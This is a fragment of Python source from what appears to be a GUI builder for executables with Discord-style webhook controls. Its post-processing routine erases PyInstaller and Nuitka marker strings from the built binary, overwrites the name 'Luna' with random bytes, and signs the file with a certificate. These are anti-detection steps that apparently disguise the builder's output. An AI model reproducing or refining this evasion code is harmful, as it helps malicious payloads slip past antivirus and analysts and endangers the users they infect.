    def PostProcessing(self, filename: str) -> None:
        logging.info("Removing MetaData")
        print("Removing MetaData")
        with open(filename, "rb") as file:
            data = file.read()
        
        # Remove PyInstaller strings
        data = data.replace(b"PyInstaller:", b"PyInstallem:")
        data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
        data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")
        
        # Remove Nuitka strings
        data = data.replace(b"NUITKA_ONEFILE_PARENT", b"NUKTEM_ONEFILE_PARENT")
        data = data.replace(b"NUITKA_ONEFILE_BINARY", b"NUKTEM_ONEFILE_BINARY")
        
        with open(filename, "wb") as file:
            file.write(data)
        
        # Renaming Entry Point
        logging.info("Renaming Entry Point")
        print("Renaming Entry Point")
        with open(filename, "rb") as file:
            data = file.read()
    
        entryPoint = "Luna"
        entryPoint = entryPoint.encode()
        new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
        data = data.replace(entryPoint, new_entryPoint)
    
        with open(filename, "wb") as file:
            file.write(data)

        # Adding Certificate
        logging.info("Adding Certificate")
        print("Adding Certificate")
        certFile = "cert"
        if os.path.isfile(certFile):
            signfile(filename, certFile, filename)
                
    def switchStateOfAll(self, state: str) -> None:
        for checkbox in self.checkboxes:
            checkbox.configure(state=state)
        self.fileopts.configure(state=state)
        self.filename.configure(state=state)
        self.icon.configure(state=state)
        self.build.configure(state=state)
        self.checkwebhook_button.configure(state=state)
        self.webhook_button.configure(state=state)


if __name__ == "__main__":
    App().mainloop()
